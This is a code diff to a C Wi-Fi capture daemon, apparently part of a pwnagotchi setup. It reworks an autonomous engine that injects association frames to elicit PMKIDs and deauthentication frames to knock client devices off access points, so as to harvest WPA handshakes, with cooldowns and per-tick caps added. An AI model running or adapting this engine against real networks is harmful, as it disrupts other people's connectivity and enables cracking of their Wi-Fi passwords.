@@ -25,7 +25,7 @@
 
 #define DEFAULT_SOCK     "/run/wificapc.sock"
 #define DEFAULT_HS_DIR   "/etc/pwnagotchi/handshakes"
-#define WIFICAPC_VER     "0.6.15"
+#define WIFICAPC_VER     "0.6.16"
 
 #define DEFAULT_AP_TTL_SEC      120
 #define DEFAULT_STA_TTL_SEC     300
@@ -666,6 +666,10 @@ static void on_handshake_event(enum hs_event evt,
                                void *user)
 {
 	struct app *a = user;
+	/* Once we hold any handshake material for this AP, stop the autonomous
+	 * engine from re-attacking it (see on_attack_timer). */
+	if (a->table)
+		table_mark_ap_captured(a->table, pl->ap_bssid);
 	switch (evt) {
 	case HS_EVT_HANDSHAKE:
 		emit_hs_event(a, "handshake.captured", pl, NULL);
@@ -742,6 +746,16 @@ static int handle_delete_handshake(struct app *a, int fd, int64_t id, const char
 
 /* ---- autonomous attack engine --------------------------------------------- */
 
+/* Autonomous-attack scheduling knobs. The old engine hit every AP + STA
+ * every tick: on a dense channel that meant dozens of auth/assoc/deauth
+ * frames (each with a driver gap) stalling the event loop, flooding the
+ * air, and burning log volume — all while re-attacking APs already cracked.
+ * Now each tick skips captured APs, honours a per-target cooldown, gives up
+ * on targets that won't yield, and caps how many frames launch per tick. */
+#define ATTACK_COOLDOWN_SEC   30   /* don't re-hit the same target within this */
+#define ATTACK_MAX_ATTEMPTS   10   /* give up on a target that won't yield */
+#define ATTACK_PER_TICK        8   /* cap assoc (and deauth) launched per tick */
+
 static void on_attack_timer(int fd, uint32_t events, void *user)
 {
 	(void)events;
@@ -752,23 +766,41 @@ static void on_attack_timer(int fd, uint32_t events, void *user)
 	if (!a->table || !a->capture || !capture_is_running(a->capture)) return;
 	if (ensure_inject(a) < 0) return;
 
+	time_t now = time(NULL);
+
+	/* --- assoc (PMKID elicitation), up to the per-tick budget --- */
 	struct ap_record aps[TABLE_MAX_APS];
 	int n_aps = table_snapshot_aps(a->table, aps, TABLE_MAX_APS);
-	for (int i = 0; i < n_aps; i++) {
+	int assoc_sent = 0;
+	for (int i = 0; i < n_aps && assoc_sent < ATTACK_PER_TICK; i++) {
+		if (aps[i].captured) continue;
+		if (aps[i].attack_count >= ATTACK_MAX_ATTEMPTS) continue;
+		if (aps[i].last_attack && now - aps[i].last_attack < ATTACK_COOLDOWN_SEC)
+			continue;
 		const char *ssid     = aps[i].ssid_len ? aps[i].ssid : NULL;
 		uint8_t     ssid_len = aps[i].ssid_len;
 		inject_assoc(a->inject, aps[i].bssid, ssid, ssid_len);
+		table_note_ap_attacked(a->table, aps[i].bssid, now);
+		assoc_sent++;
 	}
 
+	/* --- deauth associated STAs, skipping cracked APs, up to the budget --- */
 	struct sta_record stas[TABLE_MAX_STAS];
 	int n_stas = table_snapshot_stas(a->table, stas, TABLE_MAX_STAS);
-	for (int i = 0; i < n_stas; i++) {
-		if (stas[i].have_ap)
-			inject_deauth(a->inject, stas[i].ap_bssid, stas[i].mac, 2, 7);
+	int deauth_sent = 0;
+	for (int i = 0; i < n_stas && deauth_sent < ATTACK_PER_TICK; i++) {
+		if (!stas[i].have_ap) continue;
+		if (table_ap_is_captured(a->table, stas[i].ap_bssid)) continue;
+		if (stas[i].attack_count >= ATTACK_MAX_ATTEMPTS) continue;
+		if (stas[i].last_attack && now - stas[i].last_attack < ATTACK_COOLDOWN_SEC)
+			continue;
+		inject_deauth(a->inject, stas[i].ap_bssid, stas[i].mac, 2, 7);
+		table_note_sta_attacked(a->table, stas[i].mac, now);
+		deauth_sent++;
 	}
 
-	if (n_aps + n_stas > 0)
-		log_info("attack: %d assoc + %d deauth sent", n_aps, n_stas);
+	if (assoc_sent + deauth_sent > 0)
+		log_info("attack: %d assoc + %d deauth sent", assoc_sent, deauth_sent);
 }
 
 static int start_attack_timer(struct app *a, int interval_ms)
